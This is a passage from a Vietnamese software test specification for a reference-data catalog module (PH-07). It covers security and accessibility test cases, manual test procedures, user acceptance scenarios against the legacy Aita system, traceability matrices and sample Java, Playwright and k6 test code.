- **Loại** Bảo mật · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** ERR-07-042, 044 · `07.rdm.batch-rate-per-minute`
- **Tiền điều kiện / dữ liệu** APP-T68-WRITE.
- **Bước**
  1. Gửi 11 lô trong một phút.
  2. Gửi thân 70 MB.
- **Mong đợi** Lô thứ 11 `429` `ERR-07-044` có `Retry-After`. Bước 2 `413` `ERR-07-042`.

#### TC-07-312 · Kiểu nội dung không hỗ trợ
- **Loại** Bảo mật, Âm · **Ưu tiên** P3 · **Tự động** API
- **Truy vết** ERR-07-043
- **Tiền điều kiện / dữ liệu** —
- **Bước**
  1. Gửi `POST /catalogs` với `Content-Type: application/xml`.
- **Mong đợi** `415` `ERR-07-043`.

#### TC-07-313 · Không lộ thông tin trong lỗi và tiêu đề bảo mật
- **Loại** Bảo mật · **Ưu tiên** P2 · **Tự động** ZAP
- **Truy vết** ASVS V7, V14 · SEC-40…49
- **Tiền điều kiện / dữ liệu** Quét ZAP chủ động có xác thực với từng vai trò.
- **Bước**
  1. Chạy quét trên `/api/rdm/v1` và các route console PH-07.
- **Mong đợi** Không cảnh báo mức Cao; phản hồi lỗi không có ngăn xếp, tên lớp, câu SQL; có `Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options`.

#### TC-07-314 · Dữ liệu cá nhân không vào danh mục
- **Loại** Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** BR-07-025 · ERR-07-036 · Luật 91/2025/QH15
- **Tiền điều kiện / dữ liệu** —
- **Bước**
  1. Khai báo thuộc tính `so_cccd` không có `piiAcknowledged`.
  2. Khai báo thuộc tính mức `SENSITIVE`.
- **Mong đợi** Bước 1 `422` `ERR-07-036` kèm từ khớp. Bước 2 `422` `ERR-07-036`.

#### TC-07-315 · Nhật ký không chứa token và dữ liệu nhạy cảm
- **Loại** Bảo mật · **Ưu tiên** P2 · **Tự động** IT
- **Truy vết** ASVS V7.1 · SEC-60…67
- **Tiền điều kiện / dữ liệu** Mức nhật ký INFO.
- **Bước**
  1. Chạy toàn bộ TS-07-23 rồi tìm trong nhật ký chuỗi token, URL ký sẵn, giá trị bản ghi CAT-RES.
- **Mong đợi** Không tìm thấy; URL ký sẵn chỉ ghi phần đường dẫn không có chữ ký.

### TS-07-29 · Khả năng truy cập

**Mục tiêu.** Kiểm giao diện PH-07 đạt WCAG 2.2 mức AA (NFR-00-040…045) bằng axe-core tự động và kiểm thủ công với bàn phím, NVDA (mục 6.4).

**Phủ.** NFR-00-040…045; D03-06-PH07 mục 20.

#### TC-07-316 · Quét axe-core mọi route PH-07
- **Loại** Truy cập · **Ưu tiên** P1 · **Tự động** E2E
- **Truy vết** NFR-00-040 · UI-07-01…12
- **Tiền điều kiện / dữ liệu** Dữ liệu chuẩn; mỗi màn ở trạng thái có dữ liệu và trạng thái lỗi.
- **Bước**
  1. Chạy `@axe-core/playwright` với bộ luật `wcag2a`, `wcag2aa`, `wcag22aa`.
- **Mong đợi** Không vi phạm mức "serious" hoặc "critical".

#### TC-07-317 · Lưới và cây theo mẫu WAI-ARIA
- **Loại** Truy cập · **Ưu tiên** P1 · **Tự động** E2E
- **Truy vết** NFR-00-041 · D03-06-PH07 mục 20.1, 20.2
- **Tiền điều kiện / dữ liệu** UI-07-05 bản nháp CAT-BIG; UI-07-11.
- **Bước**
  1. Kiểm thuộc tính `role`, `aria-rowcount`, `aria-rowindex`, `aria-level`, `aria-expanded`; điều hướng bằng phím.
- **Mong đợi** `aria-rowcount` bằng tổng thật; dòng 1.205 có `aria-rowindex = 1206` (tính dòng tiêu đề); mọi phím ở mục 20.1, 20.2 hoạt động.

#### TC-07-318 · Khác biệt không chỉ dựa vào màu
- **Loại** Truy cập · **Ưu tiên** P2 · **Tự động** E2E
- **Truy vết** WCAG 1.4.1 · D03-06-PH07 mục 20.3
- **Tiền điều kiện / dữ liệu** UI-07-07.
- **Bước**
  1. Chụp ảnh ở chế độ thang xám; đọc cột Loại bằng cây truy cập.
- **Mong đợi** Mỗi dòng có chữ "Thêm mới", "Đã sửa", "Ngừng dùng", "Phá vỡ"; `<del>`, `<ins>` có văn bản ẩn "Giá trị cũ:", "Giá trị mới:".

#### TC-07-319 · Kích thước đích chạm và focus nhìn thấy
- **Loại** Truy cập · **Ưu tiên** P2 · **Tự động** E2E
- **Truy vết** WCAG 2.5.8, 2.4.11, 2.4.13
- **Tiền điều kiện / dữ liệu** UI-07-01, 05, 07.
- **Bước**
  1. Đo kích thước mọi nút; Tab qua toàn trang, chụp vòng focus.
- **Mong đợi** Đích ≥ 24 × 24 px; vòng focus không bị che bởi thanh dính hoặc ngăn kéo glass.

#### TC-07-320 · Ba luồng chính với NVDA
- **Loại** Truy cập · **Ưu tiên** P1 · **Tự động** Thủ công
- **Truy vết** NFR-00-040…045 · mục 6.4
- **Tiền điều kiện / dữ liệu** NVDA + Firefox; người kiểm thử không nhìn màn hình khi thực hiện.
- **Bước**
  1. Thực hiện ba luồng ở mục 6.4.
- **Mong đợi** Hoàn thành cả ba luồng; ghi nhận mọi chỗ NVDA đọc sai hoặc thiếu vào phiếu kết quả mục 6.4.

## 6. Thủ tục kiểm thử thủ công

Phần lớn ca ở mục 4 và 5 chạy tự động. Mục này mô tả bốn thủ tục phải làm bằng tay vì cần phán đoán của người, cần môi trường gần thật, hoặc cần người dùng thật.

### 6.1. Kiểm thử khám phá theo phiên

Mỗi đợt phát hành có hai phiên khám phá 90 phút, mỗi phiên một chủ đề: (1) "người dùng Aita lần đầu dùng Datahub" (người kiểm thử chỉ đọc mục 23.2 của D03-06-PH07 rồi tự làm các việc quen thuộc của hệ cũ); (2) "bản nháp bị nhiều người cùng sửa và một tác vụ nhập đang chạy". Ghi chép theo mẫu phiên (mục tiêu, thời gian, lỗi, câu hỏi, ý tưởng ca mới). Ca mới tìm được đưa vào mục 4 với mã tiếp theo, không dùng lại mã đã có.

### 6.2. Diễn tập di trú

Trước chuyển đổi chính thức của mỗi tỉnh, đội di trú chạy toàn bộ TS-07-22 trên bản sao CSDL Aita đã ẩn danh của tỉnh đó ở môi trường UAT, theo đúng thứ tự: chạy thử, rà đề xuất với cán bộ quản lý danh mục, chạy thật, đối soát, duyệt theo lô. Kết quả gồm biên bản đối soát ký bởi đại diện tỉnh và thời gian chạy thực tế của từng bước, làm đầu vào cho kế hoạch chuyển đổi ở D06-01. Diễn tập đạt khi biên bản không còn dòng đỏ chưa giải trình và tổng thời gian nằm trong cửa sổ chuyển đổi đã thống nhất.

### 6.3. Diễn tập sự cố

Mỗi quý, đội vận hành cùng đội kiểm thử chạy TC-07-174, 277, 278, 279 trên SIT theo kịch bản diễn tập ở D06-03 (hướng dẫn vận hành), ghi thời gian phát hiện (cảnh báo bật), thời gian khôi phục và mọi bước thủ công phải làm. Bước thủ công phát sinh được bổ sung vào runbook của PH-07.

### 6.4. Kiểm thử truy cập thủ công

Người kiểm thử dùng NVDA bản mới nhất với Firefox ESR, không nhìn màn hình, thực hiện ba luồng sau. Mỗi luồng ghi kết quả vào phiếu (bước, NVDA đọc gì, mong đợi, đạt hay không).

| Luồng | Các bước | Mong đợi chính |
|---|---|---|
| A. Tìm và xem danh mục | Mở UI-07-01, tìm "dân tộc", lọc nguồn quốc gia, mở chi tiết, chuyển tab Bản ghi, đọc bản ghi thứ 3 | Kết quả tìm được đọc qua vùng trạng thái; tiêu đề cột sắp xếp đọc kèm chiều; tab đọc "tab 3 trên 8" |
| B. Sửa bản ghi bản nháp | Mở UI-07-05, đi tới dòng 10 bằng phím, sửa tên, lưu bằng Ctrl+S, gây một lỗi mã trùng, sửa lại | Vị trí ô đọc "dòng 10 trên 39, cột Tên"; lỗi đọc qua `role="alert"` và đọc lại khi focus vào ô |
| C. Duyệt phiên bản | Mở UI-07-07 từ "Việc của tôi", nghe tóm tắt khác biệt, đọc 3 dòng thay đổi, nhập ý kiến, bấm Duyệt | Loại thay đổi đọc bằng chữ; giá trị cũ, mới có tiền tố; nút bị vô hiệu đọc được lý do |

Kiểm thêm phóng to 200% và độ rộng 320 px tương đương (WCAG 1.4.10) cho UI-07-01 và UI-07-07: không mất nội dung, không cuộn hai chiều trừ bảng dữ liệu.

## 7. Nghiệm thu người dùng tương đương hệ Aita

Bộ kịch bản nghiệm thu dành cho cán bộ nghiệp vụ của tỉnh thí điểm, viết bằng ngôn ngữ nghiệp vụ, mỗi kịch bản ứng với một hoặc nhiều chức năng của Aita (`LGC-DMDC`) để xác nhận hệ mới "không mất chức năng". Cán bộ thực hiện trên môi trường UAT với dữ liệu di trú của chính tỉnh mình (mục 6.2), đội kiểm thử hỗ trợ và ghi kết quả. Một kịch bản đạt khi cán bộ tự làm được không cần hướng dẫn thêm ngoài tài liệu D06-04 và kết quả đúng như mong đợi.

| Mã | Việc cán bộ làm | Chức năng Aita tương ứng | Mong đợi | FR | TC tự động liên quan |
|---|---|---|---|---|---|
| UAT-01 | Xem danh sách danh mục của tỉnh, biết tổng số và tìm một danh mục theo tên | LGC-DMDC-001 | Thấy đủ danh mục đã di trú, số lượng khớp biên bản đối soát | FR-07-001 | TC-07-001 |
| UAT-02 | Xem một danh mục phân cấp dạng cây | LGC-DMDC-002 | Cây đúng cha con như hệ cũ | FR-07-030 | TC-07-210 |
| UAT-03 | Xem chi tiết danh mục: tên, thuộc tính, bản ghi | LGC-DMDC-003 | Nội dung khớp hệ cũ, thuộc tính ẩn của hệ cũ vẫn ẩn | FR-07-002 | TC-07-001, 260 |
| UAT-04 | Tạo danh mục mới bằng tay với 3 thuộc tính | LGC-DMDC-004 | Danh mục ở trạng thái bản nháp, có đủ thuộc tính | FR-07-003, 005 | TC-07-005 |
| UAT-05 | Tạo danh mục từ tệp Excel theo khuôn cũ của Aita | LGC-DMDC-005 | Tệp khuôn cũ được nhận dạng, tạo được danh mục | FR-07-022 | TC-07-289 |
| UAT-06 | Nhập bổ sung bản ghi từ Excel và từ CSV | LGC-DMDC-006, 007 | Có bước xem trước, bản ghi lỗi được chỉ rõ dòng | FR-07-021 | TC-07-095 |
| UAT-07 | Nhập qua API từ một hệ thống của tỉnh | LGC-DMDC-008 | Bản ghi vào bản nháp, không phát hành tự động | FR-07-023 | TC-07-252 |
| UAT-08 | Sửa tên danh mục, thêm thuộc tính, sửa bản ghi | LGC-DMDC-009…011 | Sửa trên bản nháp; sau khi duyệt và phát hành, hệ thống khác thấy giá trị mới | FR-07-004, 006, 012 | TC-07-283 |
| UAT-09 | Xóa một danh mục chưa dùng; thử xóa danh mục đã phát hành | LGC-DMDC-012 | Xóa được danh mục nháp; danh mục đã phát hành chỉ ngừng hiệu lực được | FR-07-009 | TC-07-011, 012 |
| UAT-10 | Xuất danh mục ra Excel và CSV | LGC-DMDC-013, 014 | Tệp mở được, nhập lại được | FR-07-024 | TC-07-131 |
| UAT-11 | Một hệ thống của tỉnh tra danh mục qua API | LGC-DMDC-015 | Tra theo mã, theo lô, lấy lược đồ | FR-07-026, 027, 033 | TC-07-154 |
| UAT-12 | Lọc danh mục theo thuộc tính qua trình thử API | LGC-DMDC-016 | Lọc được trên thuộc tính cho phép, không gõ SQL | FR-07-032 | TC-07-169 |
| UAT-13 | Dùng danh mục dân tộc toàn quốc và bổ sung nhóm địa phương | LGC-DMDC-017 | Thấy danh mục toàn quốc, bổ sung được mã trong dải tỉnh | FR-07-048 | TC-07-216 |
| UAT-14 | Ẩn một thuộc tính khỏi hệ thống khai thác | LGC-DMDC-018 | Thuộc tính ẩn trên giao diện, tệp xuất và API, giá trị vẫn giữ | FR-07-006 | TC-07-024…038 |
| UAT-15 | Cập nhật danh mục quốc gia và xác nhận thay đổi phá vỡ | LGC-DMDC-019, LGC-NGSP-006 | Đồng bộ chạy theo lịch, thay đổi phá vỡ chờ xác nhận | FR-07-036, 037 | TC-07-182, 183 |

Kết quả nghiệm thu được tổng hợp vào biên bản nghiệm thu giai đoạn (mẫu ở D05-01). Kịch bản không đạt mà nguyên nhân là khác biệt có chủ đích so với Aita (ví dụ phải qua duyệt mới có hiệu lực) được ghi "đạt có giải trình" kèm dẫn chiếu quyết định thiết kế.

## 8. Ma trận truy vết

Ma trận dưới đây được sinh tự động từ các test case của tài liệu này (`python3 ph07/tools/gen_matrix.py`), không biên tập tay. Kết quả kiểm tra ngày 25/11/2026: 53/53 FR có ca kiểm thử, mọi FR mức M có ít nhất một ca dương và một ca âm; mọi BR, ERR-07-001…048 và NFR-07-001…015 có ít nhất một ca.

### 8.1. Yêu cầu chức năng → test case

Cột "Dương", "Âm" liệt kê ba chữ số cuối của mã TC-07. FR mức M phải có ít nhất một ca ở mỗi cột; bảng này được sinh tự động bằng `ph07/tools/gen_matrix.py` nên luôn khớp với mục 4 và 5.

| FR | Tên | Mức | LGC | Dương | Âm | Ca khác | Đạt quy tắc |
|---|---|---|---|---|---|---|---|
| FR-07-001 | Liệt kê danh mục, đếm số lượng, lọc theo nhóm, nguồn, trạng  | M | LGC-DMDC-001 | 001 | 002 | — | Có |
| FR-07-002 | Xem chi tiết danh mục: thông tin, thuộc tính, phiên bản, bản | M | LGC-DMDC-003 | 003 | 004, 220 | — | Có |
| FR-07-003 | Tạo danh mục thủ công | M | LGC-DMDC-004 | 005, 008 | 006, 007, 009 | — | Có |
| FR-07-004 | Cập nhật thông tin danh mục | M | LGC-DMDC-009 | 010, 271 | 018 | — | Có |
| FR-07-005 | Khai báo thuộc tính động có kiểu và ràng buộc | M | LGC-DMDC-004, LGC-DMDC-018 | 005, 024, 038 | 025, 026, 027, 033, 038 | — | Có |
| FR-07-006 | Sửa, ẩn, xóa, sắp thứ tự thuộc tính trong bản nháp có kiểm t | M | LGC-DMDC-010, LGC-DMDC-018 | 028, 029, 032, 136 | 027, 030, 031, 034 | — | Có |
| FR-07-007 | Cấu hình phân cấp | M | LGC-DMDC-002 | 005, 035 | 036, 037 | — | Có |
| FR-07-008 | Thiết lập nguồn và quyền cập nhật | M | LGC-DMDC-017 | 039, 040 | 041, 045 | — | Có |
| FR-07-009 | Xóa danh mục chưa phát hành; ngừng hiệu lực danh mục đã phát | M | LGC-DMDC-012 | 011, 013 | 012, 014, 015, 016, 017 | — | Có |
| FR-07-010 | Quản lý nhóm danh mục | S | mới | 019, 021 | 020, 022, 023 | — | Có |
| FR-07-011 | Tạo bản nháp phiên bản mới từ phiên bản hiện hành | M | LGC-DMDC-011 | 047, 066, 283 | 016, 048 | — | Có |
| FR-07-012 | Thêm, sửa, ngừng dùng bản ghi trên bản nháp | M | LGC-DMDC-011 | 050, 055, 057, 059, 060, 283 | 051, 058, 081 | — | Có |
| FR-07-013 | Kiểm tra hợp lệ bản ghi theo lược đồ | M | mới | 038, 050, 061 | 038, 051, 052, 053, 054, 062, 100, 123 | — | Có |
| FR-07-014 | So sánh khác biệt giữa hai phiên bản, phân loại phá vỡ và kh | M | mới | 067, 068, 070, 071 | 068, 069 | — | Có |
| FR-07-015 | Trình duyệt, duyệt, từ chối phiên bản | M | mới | 072, 073, 076, 283 | 076, 077, 078, 081, 082, 083, 085, 091, 239, 241 | — | Có |
| FR-07-016 | Phát hành phiên bản với ngày hiệu lực và căn cứ pháp lý | M | mới | 049, 074, 075, 084, 088, 090, 275, 283 | 078, 079, 080, 083, 085, 088, 089, 091, 092, 241 | 279, 300 | Có |
| FR-07-017 | Hủy bản nháp | M | mới | 064 | 065, 082 | — | Có |
| FR-07-018 | Hiển thị bản ghi dạng bảng và dạng cây | M | LGC-DMDC-002 | 063, 284 | 150, 285 | — | Có |
| FR-07-019 | Ghi mã thay thế và quan hệ kế thừa cho bản ghi ngừng dùng | M | mới | 055, 141 | 056 | — | Có |
| FR-07-020 | Tải tệp mẫu Excel/CSV sinh theo lược đồ của danh mục | M | mới | 093, 094 | 094 | — | Có |
| FR-07-021 | Nhập bản ghi từ Excel/CSV vào bản nháp | M | LGC-DMDC-006, LGC-DMDC-007 | 095, 096, 097, 098, 102, 107, 109, 111, 112, 289 | 099, 100, 101, 104, 105, 106, 108, 110, 115, 116, 117, 118 (+4) | 124, 233, 282, 298, 304, 306 (+1) | Có |
| FR-07-022 | Tạo danh mục mới từ tệp, hỗ trợ khuôn hệ cũ Aita | M | LGC-DMDC-005 | 113, 114, 121, 261, 289 | 122 | — | Có |
| FR-07-023 | Nhập bản ghi qua API theo lô, idempotent | M | LGC-DMDC-008 | 125, 127, 252 | 126, 127, 128, 129, 130, 252 | — | Có |
| FR-07-024 | Xuất phiên bản ra Excel, CSV, JSON | M | LGC-DMDC-013, LGC-DMDC-014 | 131, 132, 133, 136, 137, 209 | 134, 135, 137, 227 | 124, 299, 308 | Có |
| FR-07-025 | Xem lịch sử tác vụ nhập xuất và tải báo cáo lỗi | M | mới | 103 | 134 | — | Có |
| FR-07-026 | Tra cứu một mã tại thời điểm | M | LGC-DMDC-015 | 043, 090, 138, 140, 141, 159, 210, 275 | 015, 139, 142, 220 | 293 | Có |
| FR-07-027 | Tra cứu lô tối đa 500 mã | M | LGC-DMDC-015 | 143 | 144 | 294 | Có |
| FR-07-028 | Lấy toàn bộ bản ghi theo phiên bản | M | LGC-DMDC-015 | 043, 145, 146, 148, 156 | 147, 156, 226 | 225, 280, 296 | Có |
| FR-07-029 | Lấy cây hoặc nhánh con | M | LGC-DMDC-002, LGC-DMDC-015 | 149 | 150 | — | Có |
| FR-07-030 | Tìm kiếm không dấu trong danh mục | S | mới | 151 | — | 228 | Có |
| FR-07-031 | Lấy thay đổi kể từ một phiên bản (delta) | M | LGC-DMDC-015 | 152 | 153 | — | Có |
| FR-07-032 | API truy vấn có cấu trúc | M | LGC-DMDC-016 | 157, 158, 159, 160, 167, 169 | 161, 162, 163, 164, 165, 166, 168, 170 | 228, 297 | Có |
| FR-07-033 | Liệt kê danh mục và lấy lược đồ qua API | M | LGC-DMDC-015 | 038, 154 | 038, 155 | — | Có |
| FR-07-034 | Phát sự kiện thay đổi danh mục | M | mới | 171, 173, 175 | 172, 176 | 174 | Có |
| FR-07-035 | Cấu hình nguồn đồng bộ danh mục quốc gia | M | LGC-DMDC-019, LGC-NGSP-006 | 177 | 178 | — | Có |
| FR-07-036 | Chạy đồng bộ theo lịch hoặc theo yêu cầu và tính khác biệt | M | LGC-DMDC-019, LGC-NGSP-006 | 179, 180, 181, 182 | 186, 189 | 233 | Có |
| FR-07-037 | Xác nhận hoặc từ chối thay đổi từ nguồn quốc gia | M | mới | 183, 184 | 185, 244 | — | Có |
| FR-07-038 | Khám phá danh mục quốc gia và đăng ký đồng bộ | M | LGC-NGSP-006 | 187 | 188 | — | Có |
| FR-07-039 | Đề xuất bổ sung bản ghi lên danh mục quốc gia | C | mới | 190 | 190 | — | Có |
| FR-07-040 | Quản lý hệ thống mã ngoài | M | LGC-BUS-036 | 191 | 192, 229 | — | Có |
| FR-07-041 | Quản lý bảng ánh xạ mã giữa danh mục và hệ thống mã ngoài | M | LGC-BUS-036 | 193, 195, 245 | 194, 195, 229, 245 | — | Có |
| FR-07-042 | Chuyển mã qua bảng ánh xạ | M | LGC-BUS-036 | 196, 197 | 198, 229 | 295 | Có |
| FR-07-043 | Báo cáo độ phủ ánh xạ | S | mới | 199 | 199 | — | Có |
| FR-07-044 | Quản lý danh mục ĐVHC hai cấp kèm lịch sử ba cấp | M | mới | 203, 210 | 202, 203 | — | Có |
| FR-07-045 | Ghi nhận sự kiện sắp xếp ĐVHC | M | mới | 175, 200 | 201, 202 | — | Có |
| FR-07-046 | Chuyển đổi mã ĐVHC cũ sang mới và tra ngược | M | mới | 204, 205, 207, 209 | 206, 208 | 303 | Có |
| FR-07-047 | Xem dòng lịch sử của một bản ghi | M | mới | 211, 213 | 212 | — | Có |
| FR-07-048 | Chia sẻ danh mục toàn quốc giữa các tenant và mở rộng HYBRID | M | LGC-DMDC-017 | 039, 040, 043, 046, 167, 214, 215, 216, 262 | 044, 214, 216 | — | Có |
| FR-07-049 | Nạp gói danh mục nền khi khởi tạo tenant | M | mới | 217 | 218, 219 | — | Có |
| FR-07-050 | Lịch sử thay đổi và kiểm toán | M | mới | 137, 248, 256, 257 | 137, 258 | 230, 259 | Có |
| FR-07-051 | Di trú dữ liệu danh mục từ hệ cũ Aita | M | LGC-DMDC-001, LGC-DMDC-002, LGC-DMDC-003… | 260, 261, 262, 264, 266 | 263, 265, 267 | — | Có |
| FR-07-052 | Khai thác danh mục hạn chế và cấp quyền khai thác | M | mới | 246, 268, 271 | 168, 246, 269, 270 | 259 | Có |
| FR-07-053 | Tham số PH-07 theo tenant | S | mới | 247, 272, 274 | 247, 273 | 087 | Có |

### 8.2. Chức năng hệ cũ → yêu cầu → test case

Mỗi chức năng của Aita (`LGC-DMDC`) và NGSP liên quan được truy tới FR mới và tới ca tự động, ca nghiệm thu. Đây là bằng chứng "không mất chức năng" cho hội đồng.

| LGC | FR | TC tự động | UAT |
|---|---|---|---|
| LGC-BUS-036 | 040, 041, 042 | 191, 193, 195, 196, 197, 245 | — |
| LGC-DMDC-001 | 001, 051 | 001, 260 | UAT-01 |
| LGC-DMDC-002 | 007, 018, 029, 051 | 005, 035, 063, 149, 260, 284 | UAT-02 |
| LGC-DMDC-003 | 002, 051 | 003, 260 | UAT-03 |
| LGC-DMDC-004 | 003, 005, 051 | 005, 008, 024, 038, 260 | UAT-04 |
| LGC-DMDC-005 | 022, 051 | 113, 114, 121, 260, 261, 289 | UAT-05 |
| LGC-DMDC-006 | 021, 051 | 095, 096, 097, 098, 102, 107, 109, 111 (+3) | UAT-06 |
| LGC-DMDC-007 | 021, 051 | 095, 096, 097, 098, 102, 107, 109, 111 (+3) | UAT-06 |
| LGC-DMDC-008 | 023, 051 | 125, 127, 252, 260 | UAT-07 |
| LGC-DMDC-009 | 004, 051 | 010, 260, 271, 283 | UAT-08 |
| LGC-DMDC-010 | 006, 051 | 028, 029, 032, 136, 260, 283 | UAT-08 |
| LGC-DMDC-011 | 011, 012, 051 | 047, 050, 055, 057, 059, 060, 066, 260 (+1) | UAT-08 |
| LGC-DMDC-012 | 009, 051 | 011, 013, 260 | UAT-09 |
| LGC-DMDC-013 | 024, 051 | 131, 132, 133, 136, 137, 209, 260 | UAT-10 |
| LGC-DMDC-014 | 024, 051 | 131, 132, 133, 136, 137, 209, 260 | UAT-10 |
| LGC-DMDC-015 | 026, 027, 028, 029, 031, 033, 051 | 038, 043, 090, 138, 140, 141, 143, 145 (+10) | UAT-11 |
| LGC-DMDC-016 | 032, 051 | 157, 158, 159, 160, 167, 169, 260 | UAT-12 |
| LGC-DMDC-017 | 008, 048, 051 | 039, 040, 043, 046, 167, 214, 215, 216 (+2) | UAT-13 |
| LGC-DMDC-018 | 005, 006, 051 | 005, 024, 028, 029, 032, 038, 136, 260 | UAT-14 |
| LGC-DMDC-019 | 035, 036, 051 | 177, 179, 180, 181, 182, 260, 262 | UAT-15 |
| LGC-NGSP-006 | 035, 036, 038 | 177, 179, 180, 181, 182, 187 | UAT-15 |

### 8.3. Quy tắc nghiệp vụ → test case

| Mã | Test case |
|---|---|
| BR-07-001 | 005, 006, 007, 214, 249 |
| BR-07-002 | 051, 099 |
| BR-07-003 | 055, 058, 097 |
| BR-07-004 | 055, 141, 148 |
| BR-07-005 | 048 |
| BR-07-006 | 027, 066, 074, 079, 080 |
| BR-07-007 | 074, 089 |
| BR-07-008 | 015, 090, 140, 142 |
| BR-07-009 | 044, 045 |
| BR-07-010 | 040, 041, 042, 044, 216 |
| BR-07-011 | 073, 077, 078, 180, 217, 239, 240, 241, 264 |
| BR-07-012 | 085, 086, 087, 098, 182, 272 |
| BR-07-013 | 029, 030, 031, 032, 033, 034, 068 |
| BR-07-014 | 035, 036, 037, 053, 054, 056, 062 |
| BR-07-015 | 101, 102, 110, 128 |
| BR-07-016 | 104, 105 |
| BR-07-017 | 180, 181, 182 |
| BR-07-018 | 157, 162, 166 |
| BR-07-019 | 268 |
| BR-07-020 | 014 |
| BR-07-021 | 200, 201 |
| BR-07-022 | 204, 205 |
| BR-07-023 | 193, 194 |
| BR-07-024 | 194 |
| BR-07-025 | 025, 190, 263, 314 |
| BR-07-026 | 083, 084, 085, 086, 092 |
| BR-07-027 | 088, 203, 264 |
| BR-07-040 | 018 |
| BR-07-041 | 119 |

### 8.4. Mã lỗi → test case

| Mã | Test case |
|---|---|
| ERR-07-001 | 004, 094, 155, 198, 212 |
| ERR-07-002 | 006, 007, 122, 178, 188, 192 |
| ERR-07-003 | 044, 045, 129, 178, 190, 202, 214 |
| ERR-07-004 | 018, 027, 065, 079, 080, 081, 082, 083, 129, 202 |
| ERR-07-005 | 048, 189 |
| ERR-07-006 | 069, 135, 153, 155, 208 |
| ERR-07-007 | 139, 142, 150, 194, 212 |
| ERR-07-008 | 042, 051, 099, 216, 267 |
| ERR-07-009 | 026, 052, 056, 123, 128, 178, 184, 206, 258, 267 (+1) |
| ERR-07-010 | 053, 054, 056 |
| ERR-07-011 | 037, 053 |
| ERR-07-012 | 041, 216 |
| ERR-07-013 | 058 |
| ERR-07-014 | 030, 031, 033, 034 |
| ERR-07-015 | 077, 078, 239, 240 |
| ERR-07-016 | 085, 086, 098, 203 |
| ERR-07-017 | 088, 089 |
| ERR-07-018 | 018, 178, 192, 269, 285 |
| ERR-07-019 | 115, 116, 117, 118, 120, 122, 218, 304, 306 |
| ERR-07-020 | 104, 105, 106, 108, 134 |
| ERR-07-021 | 101 |
| ERR-07-022 | 009, 127, 218 |
| ERR-07-023 | 161, 163, 170 |
| ERR-07-024 | 164, 165 |
| ERR-07-025 | 162, 170 |
| ERR-07-026 | 126, 144, 190, 194, 198, 208 |
| ERR-07-027 | 195 |
| ERR-07-028 | 186, 188, 190 |
| ERR-07-029 | 185 |
| ERR-07-030 | 168, 198, 212, 270 |
| ERR-07-031 | 015, 016 |
| ERR-07-032 | 014 |
| ERR-07-033 | 194 |
| ERR-07-034 | 194 |
| ERR-07-035 | 201 |
| ERR-07-036 | 025, 263, 314 |
| ERR-07-037 | 022 |
| ERR-07-038 | 119, 305 |
| ERR-07-039 | 020, 023 |
| ERR-07-040 | 018, 310 |
| ERR-07-041 | 254 |
| ERR-07-042 | 311 |
| ERR-07-043 | 312 |
| ERR-07-044 | 311 |
| ERR-07-045 | 192, 198, 199, 218 |
| ERR-07-046 | 236, 309 |
| ERR-07-047 | 219, 258, 279, 290 |
| ERR-07-048 | 012, 017, 218 |

### 8.5. Yêu cầu phi chức năng → test case

| Mã | Test case |
|---|---|
| NFR-07-001 | 293 |
| NFR-07-002 | 294, 295 |
| NFR-07-003 | 296 |
| NFR-07-004 | 160, 165, 297 |
| NFR-07-005 | 298 |
| NFR-07-006 | 299 |
| NFR-07-007 | 171, 174, 300 |
| NFR-07-008 | 301, 302 |
| NFR-07-009 | 225, 275, 276 |
| NFR-07-010 | 277, 278 |
| NFR-07-011 | 301 |
| NFR-07-012 | 120, 281, 302 |
| NFR-07-013 | 186 |
| NFR-07-014 | 186 |
| NFR-07-015 | 137 |

## 9. Tự động hóa và tệp đi kèm

### 9.1. Tổ chức mã kiểm thử

```text
apps/data/src/test/java/vn/datahub/data/rdm/
├── unit/            UT: bộ dịch DSL, bộ phân loại thay đổi, bộ chuyển mã ĐVHC, bộ suy kiểu
├── it/              IT: RdmIntegrationTestBase (Testcontainers), RLS, outbox, bộ đệm, worker
├── api/             ST: REST Assured theo TS-07-nn, một lớp mỗi kịch bản (Ts07_13_QueryDslTest…)
├── tenant/          thẻ @Tag("tenant-leak"), TS-07-19
└── migration/       thẻ @Tag("migration"), TS-07-22
apps/console/e2e/rdm/        Playwright, một tệp spec mỗi luồng mục 22 của D03-06-PH07
perf/rdm/                    k6, một tệp mỗi ca TC-07-293…303
```

Mỗi phương thức kiểm thử mang chú thích `@TestCase("TC-07-nnn")` (chú thích nội bộ của dự án); báo cáo JUnit XML được hậu xử lý để đối chiếu với ma trận mục 8, ca nào có trong tài liệu mà không có mã tự động (trừ ca "Thủ công") làm pipeline cảnh báo.

### 9.2. Mẫu kiểm thử tích hợp rò rỉ chéo tenant

```java
@Tag("tenant-leak")
@TestCase("TC-07-220")
class CrossTenantReadIT extends RdmIntegrationTestBase {

    @Test
    void tenantKhacKhongDocDuocDanhMucRieng() {
        given().auth().oauth2(token("U-T01-DS"))
            .when().get("/api/rdm/v1/catalogs/TRAM_QUAN_TRAC")
            .then().statusCode(404)
            .body("code", equalTo("ERR-07-001"));
    }

    @Test
    void danhMucTrungMaTraVeDungTenant() {
        List<String> names = given().auth().oauth2(token("U-T01-DS"))
            .when().get("/api/rdm/v1/catalogs/LOAI_HINH_TC/items?size=200")
            .then().statusCode(200)
            .extract().jsonPath().getList("items.name");
        assertThat(names).isNotEmpty().allMatch(n -> n.endsWith("(T01)"));
    }
}
```

### 9.3. Mẫu kiểm thử giao diện

```ts
// apps/console/e2e/rdm/review-publish.spec.ts — TC-07-283, TC-07-316
import { test, expect } from '@playwright/test';
import AxeBuilder from '@axe-core/playwright';

test('duyệt và phát hành phiên bản từ Việc của tôi', async ({ page }) => {
  await page.goto('/my-tasks');
  await page.getByRole('link', { name: /Loại hình tổ chức.*chờ duyệt/ }).click();
  await expect(page.getByRole('complementary', { name: 'Quyết định phiên bản' })).toBeVisible();
  await page.getByLabel('Ngày hiệu lực').fill('22/11/2026');
  await page.getByRole('button', { name: 'Duyệt và phát hành' }).click();
  await expect(page.getByRole('status')).toContainText('Đã phát hành phiên bản');
  const axe = await new AxeBuilder({ page }).withTags(['wcag2a', 'wcag2aa', 'wcag22aa']).analyze();
  expect(axe.violations.filter(v => ['serious', 'critical'].includes(v.impact ?? ''))).toEqual([]);
});
```

### 9.4. Mẫu kịch bản tải

```js
// perf/rdm/tc-293-lookup.js — NFR-07-001
import http from 'k6/http';
import { check } from 'k6';
export const options = {
